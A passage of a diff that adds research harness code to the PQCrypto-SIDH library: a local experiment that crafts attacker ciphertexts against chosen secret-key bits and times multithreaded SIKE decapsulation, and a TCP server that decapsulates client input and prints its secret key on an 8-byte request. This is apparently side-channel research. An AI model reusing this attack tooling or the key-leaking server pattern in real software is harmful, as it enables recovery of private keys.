0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
++
++typedef struct {
++    unsigned char ss[CRYPTO_BYTES];
++    unsigned char ct[CRYPTO_CIPHERTEXTBYTES];
++    unsigned char sk[CRYPTO_SECRETKEYBYTES];
++} sike_dec_struct;
++
++
++void * sike_thread(void *args)
++{
++    sike_dec_struct *actual_args = args;
++    if(amplification == 0){
++        crypto_kem_dec(actual_args->ss, actual_args->ct, actual_args->sk);
++    }else{
++        crypto_kem_dec_amplification(actual_args->ss, actual_args->ct, actual_args->sk, amplification);  
++    } 
++    return 0;
++}
++
++
++
++int main(int argc , char *argv[])
++{
++    int flip_key = atoi(argv[1]);
++
++    int key_index = atoi(argv[2]);
++    
++    int target_bit = atoi(argv[3]);
++	
++    int number_thread = atoi(argv[4]);
++	
++    int iteration = atoi(argv[5]);
++    
++    amplification = atoi(argv[6]);
++    
++    printf("flip_key %d\n", flip_key); 
++    printf("key_index %d\n", key_index);
++    printf("target_bit %d\n", target_bit); 
++    printf("number_thread %d\n", number_thread); 
++    printf("iteration %d\n", iteration); 
++    printf("amplification %d\n", amplification);   
++     
++    unsigned char sk[CRYPTO_SECRETKEYBYTES] = {0};
++    unsigned char pk[CRYPTO_PUBLICKEYBYTES] = {0}; 
++    if(key_index == 1){
++        strcpy(sk, sk1);
++    }else if(key_index == 2){
++        strcpy(sk, sk2);
++    }else if(key_index == 3){
++        strcpy(sk, sk3);
++    }else if(key_index == 4){
++        strcpy(sk, sk4);
++    }else if(key_index == 5){
++        strcpy(sk, sk5);
++    }else if(key_index == 6){
++        strcpy(sk, sk6);
++    }else if(key_index == 7){
++        strcpy(sk, sk7);
++    }else if(key_index == 8){
++        strcpy(sk, sk8);
++    }else if(key_index == 9){
++        strcpy(sk, sk9);
++    }else if(key_index == 10){
++        strcpy(sk, sk10);
++    }
++    
++    unsigned char sk_flipped[CRYPTO_SECRETKEYBYTES] = {0};
++    strcpy(sk_flipped, sk);
++    if(flip_key == 1){
++        crypto_flipsecret(sk, sk_flipped, target_bit);
++        strcpy(sk, sk_flipped);
++    }
++    // crypto_printsecret_oneline(sk);
++     
++    // Generate the public key
++    crypto_generate_pub(pk,sk);
++    
++    // Print the target swap
++    int target_swap = crypto_target_swap(sk, target_bit);
++    printf("target_swap: %d\n", target_swap);
++        
++    // Get the ciphertext for attacker    
++    unsigned char ss[CRYPTO_BYTES] = {0};
++    unsigned char ct[CRYPTO_CIPHERTEXTBYTES] = {0};
++    crypto_kem_enc(ct, ss, pk);
++    
++    unsigned char fake_pk[CRYPTO_PUBLICKEYBYTES] = {0};
++    int* sk_recovered =(int*) malloc( 378 * sizeof(int) );
++    crypto_sk_to_int(sk, sk_recovered);	
++    
++    // Prepare ciphertext for attacker 
++    prep_ct(sk_recovered, 378, target_bit, fake_pk);
++    memcpy(ct, fake_pk, CRYPTO_PUBLICKEYBYTES); 
++
++    for(int i =0; i<iteration; i++){
++        sike_dec_struct* sike_structs = (sike_dec_struct*)malloc(number_thread * sizeof(sike_dec_struct));
++        for(int j = 0; j < number_thread; j++){
++            memcpy(sike_structs[j].ct, ct, CRYPTO_CIPHERTEXTBYTES); 
++            memcpy(sike_structs[j].sk, sk, CRYPTO_SECRETKEYBYTES); 	    
++        }
++    
++        pthread_t* tids = (pthread_t*)malloc(number_thread * sizeof(pthread_t));;
++            
++        struct timespec tstart={0,0}, tend={0,0};
++        clock_gettime(CLOCK_MONOTONIC, &tstart);
++        
++        for(int j = 0; j < number_thread; j++){
++            pthread_create(&tids[j], NULL, sike_thread, &sike_structs[j]);	
++        }
++        
++        for (int j = 0; j < number_thread; j++){
++            pthread_join(tids[j], NULL);
++        }
++        
++        clock_gettime(CLOCK_MONOTONIC, &tend);
++        printf("sike took about %.5f seconds\n",
++                ((double)tend.tv_sec + 1.0e-9*tend.tv_nsec) - 
++                ((double)tstart.tv_sec + 1.0e-9*tstart.tv_nsec));
++            
++        free(sike_structs); 	
++        free(tids);
++    }    
++          
++    free(sk_recovered);
++    return 0;       
++}        
++
+diff -ruN '--exclude=.git' PQCrypto-SIDH/tests/server.c PQCrypto-SIDH-modify-backup/tests/server.c
+--- PQCrypto-SIDH/tests/server.c	1969-12-31 18:00:00.000000000 -0600
++++ PQCrypto-SIDH-modify-backup/tests/server.c	2022-06-05 13:15:30.677505938 -0500
+@@ -0,0 +1,120 @@
++// Code from Yingchen
++#include "../src/random/random.h"
++#include <stdio.h>
++#include <stdlib.h>
++#include <sys/ioctl.h>
++#include <sys/poll.h>
++#include <sys/socket.h>
++#include <sys/time.h>
++#include <netinet/in.h>
++#include <errno.h>
++#include <pthread.h> 
++
++
++unsigned char sk[CRYPTO_SECRETKEYBYTES] = {0};
++unsigned char pk[CRYPTO_PUBLICKEYBYTES] = {0};
++char pubkey_query[5] = {'p', 'u', 'b', '?', '\0'};
++// The per thread per connection solution
++void *connection_handler(void *);
++
++int main(int argc , char *argv[])
++{
++	// Generate random keys
++    crypto_kem_keypair(pk, sk);
++        
++	int socket_desc , client_sock , c , *new_sock;
++	struct sockaddr_in server , client;
++	
++	// Create socket
++	socket_desc = socket(AF_INET , SOCK_STREAM , 0);
++	if (socket_desc == -1)
++	{
++		printf("Could not create socket");
++	}
++	puts("Socket created");
++	
++	// Prepare the sockaddr_in structure
++	server.sin_family = AF_INET;
++	server.sin_addr.s_addr = INADDR_ANY;
++	server.sin_port = htons( 9000 );
++	
++	// Bind
++	if( bind(socket_desc,(struct sockaddr *)&server , sizeof(server)) < 0)
++	{
++		// Print the error message
++		perror("bind failed. Error");
++		return 1;
++	}
++	puts("bind done");
++	
++	// Listen
++	listen(socket_desc , 2000);
++	
++	// Accept and incoming connection
++	puts("Waiting for incoming connections...");
++	c = sizeof(struct sockaddr_in);
++	
++	while( (client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c)) )
++	{
++        if(client_sock>0){
++            pthread_t sniffer_thread;
++            new_sock = malloc(sizeof(*new_sock));
++            *new_sock = client_sock;
++            
++            if( pthread_create( &sniffer_thread , NULL ,  connection_handler , (void*) new_sock) < 0){
++                perror("could not create thread");
++                return 1;
++            }
++			// Need to detach the thread otherwise server memory usage will go up
++            pthread_detach(sniffer_thread);
++	    }
++	}
++	
++	if(client_sock < 0)
++	{
++		perror("accept failed");
++		return 1;
++	}
++	
++	return 0;
++}
++
++
++void *connection_handler(void *socket_desc)
++{
++	// Get the socket descriptor
++	int sock = *(int*)socket_desc;
++	int read_size;
++	unsigned char ss_[CRYPTO_BYTES] = {0};
++	unsigned char ct[CRYPTO_CIPHERTEXTBYTES] = {0};
++	
++	char reply_message[6] = {'s', 'i', 'k', 'e', '!', '\0'};
++	
++	// Receive a message from client
++	if( (read_size = recv(sock , ct , CRYPTO_CIPHERTEXTBYTES , 0)) > 0 )
++	{
++	    if(read_size==5){
++	        write(sock , pk , CRYPTO_PUBLICKEYBYTES);	        
++	    }else if(read_size==8){
++	        crypto_printsecret(sk);
++	    }else{
++	        crypto_kem_dec(ss_, ct, sk);
++	        write(sock , reply_message , 6);
++	    }
++	}
++	
++	if(read_size == 0)
++	{
++		fflush(stdout);
++	}
++	else if(read_size == -1)
++	{
++		perror("recv failed");
++	}
++	
++	close(sock);	
++	// Free the socket pointer
++	free(socket_desc);
++	
++	return 0;
++}
+diff -ruN '--exclude=.git' PQCrypto-SIDH/tests/test_SIKEp751_CLIENT.c PQCrypto-SIDH-modify-backup/tests/test_SIKEp751_CLIENT.c
+--- PQCrypto-SIDH/tests/test_SIKEp751_CLIENT.c	1969-12-31 18:00:00.000000000 -0600
++++ PQCrypto-SIDH-modify-backup/tests/test_SIKEp751_CLIENT.c	2022-02-23 16:57:46.141852850 -0600
+@@ -0,0 +1,17 @@
++/********************************************************************************************
++* SIDH: an efficient supersingular isogeny cryptography library
++*********************************************************************************************/ 
++// Code from Yingchen
++#include <stdio.h>
++#include <string.h>
++#include "test_extras.h"
++#include "../src/P751/P751_api.h"
++
++
++#define SCHEME_NAME    "SIKEp751"
++
++#define crypto_kem_keypair            crypto_kem_keypair_SIKEp751
++#define crypto_kem_enc                crypto_kem_enc_SIKEp751
++#define crypto_kem_dec                crypto_kem_dec_SIKEp751
++#define crypto_printsecret            crypto_printsecret_SIKEp751
++#include "client.c"
+diff -ruN '--exclude=.git' PQCrypto-SIDH/tests/test_SIKEp751_LOCAL.c PQCrypto-SIDH-modify-backup/tests/test_SIKEp751_LOCAL.c
+--- PQCrypto-SIDH/tests/test_SIKEp751_LOCAL.c	1969-12-31 18:00:00.000000000 -0600
++++ PQCrypto-SIDH-modify-backup/tests/test_SIKEp751_LOCAL.c	2022-02-23 16:57:48.889972838 -0600
+@@ -0,0 +1,23 @@
++/********************************************************************************************
++* SIDH: an efficient supersingular isogeny cryptography library
++*********************************************************************************************/ 
++// Code from Yingchen
++#include <stdio.h>
++#include <string.h>
++#include "test_extras.h"
++#include "../src/P751/P751_api.h"
++
++
++#define SCHEME_NAME    "SIKEp751"
++
++#define crypto_kem_keypair            crypto_kem_keypair_SIKEp751
++#define crypto_kem_enc                crypto_kem_enc_SIKEp751
++#define crypto_kem_dec                crypto_kem_dec_SIKEp751
++#define crypto_printsecret            crypto_printsecret_SIKEp751
++#define crypto_printsecret_oneline    crypto_printsecret_oneline_SIKEp751
++#define crypto_generate_pub           crypto_generate_pub_SIKEp751
++#define crypto_flipsecret             crypto_flipsecret_SIKEp751
++#define crypto_target_swap            crypto_target_swap_SIKEp751
++#define crypto_sk_to_int              crypto_sk_to_int_SIKEp751
++#define crypto_kem_dec_amplification  crypto_kem_dec_amplification_SIKEp751
++#include "local.c"
+diff -ruN '--exclude=.git' PQCrypto-SIDH/tests/test_SIKEp751_SERVER.c PQCrypto-SIDH-modify-backup/tests/test_SIKEp751_SERVER.c
+--- PQCrypto-SIDH/tests/test_SIKEp751_SERVER.c	1969-12-31 18:00:00.000000000 -0600
++++ PQCrypto-SIDH-modify-backup/tests/test_SIKEp751_SERVER.c	2022-02-23 16:57:52.914147599 -0600
+@@ -0,0 +1,17 @@
++/********************************************************************************************
++* SIDH: an efficient supersingular isogeny cryptography library
++*********************************************************************************************/ 
++// Code from Yingchen
++#include <stdio.h>
++#include <string.h>
++#include "test_extras.h"
++#include "../src/P751/P751_api.h"
++
++
++#define SCHEME_NAME    "SIKEp751"
++
++#define crypto_kem_keypair            crypto_kem_keypair_SIKEp751
++#define crypto_kem_enc                crypto_kem_enc_SIKEp751
++#define crypto_kem_dec                crypto_kem_dec_SIKEp751
++#define crypto_printsecret            crypto_printsecret_SIKEp751
++#include "server.c"
